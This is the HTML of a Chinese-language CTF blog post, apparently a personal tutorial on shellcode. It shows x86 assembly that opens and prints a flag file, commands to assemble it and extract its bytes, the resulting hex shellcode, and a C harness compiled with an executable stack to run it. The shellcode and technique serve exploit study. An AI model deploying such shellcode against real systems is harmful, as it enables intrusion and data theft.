@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Shellcode | Mars&#39; Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Shellcodevulvul.c shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。 shellcode 通常透過撰寫組合語言之後透過工">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode">
+<meta property="og:url" content="http://yojo3000.github.io/CTF/Shellcode/index.html">
+<meta property="og:site_name" content="Mars&#39; Blog">
+<meta property="og:description" content="Shellcodevulvul.c shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。 shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler 會自動幫 pro">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-11-27T10:51:36.978Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Shellcode">
+<meta name="twitter:description" content="Shellcodevulvul.c shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。 shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler 會自動幫 pro">
+  
+    <link rel="alternate" href="/atom.xml" title="Mars&#39; Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mars&#39; Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yojo3000.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Shellcode" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/CTF/Shellcode/" class="article-date">
+  <time datetime="2015-11-21T04:35:59.000Z" itemprop="datePublished">2015-11-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Shellcode
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Shellcode<br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTedV9GNEpGMmxOcm8" target="_blank" rel="noopener">vul</a><br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeM0FyTWFXblE0WEE" target="_blank" rel="noopener">vul.c</a></p>
+<p>shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。</p>
+<p>shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler 會自動幫 programmer 加入不少東西因此產生的 shellcode 也會有太多不必要的部分因而容易出錯，因此採用組合語言是比較簡單的作法。</p>
+<a id="more"></a>
+<p>現在由於系統多預設開啟 DEP (可執行處不可寫，可寫處不可執行)，因此 shellcode 的用處已經大大降低，不過事實上有許多線上服務還在使用非常舊的系統，前陣子新聞才說法國機場停擺起因於用了 n 年的 windows 3.1 當機惹，現在想想其實機場採用 windows 3.1 一直沒更新也真的是頗為神奇。</p>
+<p>要怎麼看有沒有開啟 DEP 呢？透過下列指令觀看 stack 段是否有可以執行的權限就知道了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./vul &amp;				// 背景執行</span><br><span class="line">ps				// 列出目前正在執行的 process id</span><br><span class="line">cat /proc/`pidof vul`/maps</span><br></pre></td></tr></table></figure>
+<p>如果發現 stack 段可以執行，表示 local variable 中的 buffer 可能可以 overflow 之後跳至 shellcode 區域執行，實作拿到 shell 的 asm code 其實 google 一下有頗多資料，因此其實常常並不需要真的自己寫，現在已實作開啟 /home/shellcode/flag 為例的 shellcode</p>
+<p>fileread.asm<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global _start section .text _start:  xor ecx, ecx 				; set ecx to 0  xor eax, eax 				; set eax to 0open:  mov al, 0x05 				; system call 5 is ‘open’  push ecx    push 0x67616c66 ;galf  push 0x2f65646f ;/edo  push 0x636c6c65 ;clle  push 0x68732f65 ;hs/e  push 0x6d6f682f ;moh/  mov ebx, esp  int 0x80				; call system call read:  xchg eax, ebx			; exchange value of two register  xchg eax, ecx  mov al, 0x03  mov dx, 0x0FFF  inc edx  int 0x80 write:  xchg eax, edx  mov bl, 0x01  shr eax, 0x0A  int 0x80 exit:  xchg eax, ebx  int 0x80</span><br></pre></td></tr></table></figure></p>
+<p>其實以上 asm 也是 github 開放原始碼的資料稍做修改而已，以上 asm 做的事情為先設定要用到的 register 為零 (初始化)，再來利用 open system call 開啟 /home/shellcode/flag 檔案 (little endian)，然後利用 read system call 讀取資料後再用 write system call 顯示在螢幕上，最後 exit system call 結束程式。</p>
+<p>shellcode寫好之後需要測試是否能正確執行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf xxx.asm  // -f: choose the format// 可以加上 -o xxx 來指定輸出的 object file 名稱// 若沒有 -o 則預設為 xxx.o 檔案輸出</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -s -o xxx.o fileName// ld: static linker// -m elf_i386 輸出 x86 elf// -s: strip-all (清除不必要的訊息，使文件減肥)// -o 指定要連結的 object file</span><br></pre></td></tr></table></figure>
+<p>elf: (Executable and Linkable Format)<br>指 linux 上的執行檔，地位相同於 windows 上的 exe 檔案</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -d xxx.o or xxx(executable)// 可以透過 objdump 反組譯 object 或是 elf 檔案成 asm 及 machine codeobjdump -d ./filename.o|grep &apos;[0-9a-f]:&apos;|grep -v &apos;file&apos;|cut -f2 -d:|cut -f1-6 -d&apos; &apos;|tr -s &apos; &apos;|tr &apos;\t&apos; &apos; &apos;|sed &apos;s/ $//g&apos;|sed &apos;s/ /\\x/g&apos;|paste -d &apos;&apos; -s |sed &apos;s/^/&quot;/&apos;|sed &apos;s/$/&quot;/g&apos;</span><br><span class="line">// 以上指令加入正確檔名之後可以單獨列出 objdump 的 machine 結果並且加上 \x</span><br></pre></td></tr></table></figure>
+<p>###完成上述步驟之後就可以實際執行 shellcode 測試，先在本地端實際加上 /home/shellcode/flag 檔案並且加入 hello world 於 flag 檔案中，透過下列方式於 C 語言中執行 shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char code[] = &quot;\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x66\x6c\x61\x67\x68\x6f\x64\x65\x2f\x68\x65\x6c\x6c\x63\x68\x65\x2f\x73\x68\x68\x2f\x68\x6f\x6d\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80&quot;;</span><br><span class="line">int main(int argc, char **argv)&#123;  int (*func)();  func = (int (*)()) code;  (int)(*func)();&#125;</span><br></pre></td></tr></table></figure>
+<p>###上述程式執行指向 shellcode 的記憶體位置後執行之，透過下列指令編譯</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 test.c -z execstack// m32: 編譯出 32bit 執行檔案// -z execstack: 使得 stack 段為可執行</span><br></pre></td></tr></table></figure>
+<p>執行編譯出來的 x86 elf 執行檔看看是否會出現 hello world 就知道成功與否</p>
+<p>在貼上自己的 shellcode 之前可以先用下列方式測試是否真的能成功執行 shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char code[] = &quot;\xeb\xfe\n&quot;;</span><br><span class="line">// 相當於無窮迴圈指令</span><br></pre></td></tr></table></figure>
+<p>若執行該段 shellcode 的時候程式沒有 crash 那表示該區段確實可以放置 shellcode 並且執行之<br>(如果塞了沒有意義的 shellcode 則執行時就會 segmentation fault)</p>
+<p><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTedDlnZ2lBZV9lRFU" target="_blank" rel="noopener">payload.py</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yojo3000.github.io/CTF/Shellcode/" data-id="cjbfvxh10000j97pwgvd9pfre" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/CTF/Wireshark-Package-Analysis/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Wireshark Package Analysis
+        
+      </div>
+    </a>
+  
+  
+    <a href="/CTF/ROP-Return-Oriented-Programming/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ROP (Return Oriented Programming)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Server/">Linux Server</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apache-SSL/">Apache SSL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Apache-SSL/" style="font-size: 10px;">Apache SSL</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/uncategorized/Chenk-Kung-Hill/">成功嶺新訓筆記</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Bubble-Sort/">Bubble-Sort</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Return-to-libc/">Return to libc</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Wireshark-Package-Analysis/">Wireshark Package Analysis</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Shellcode/">Shellcode</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Mars Huang<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
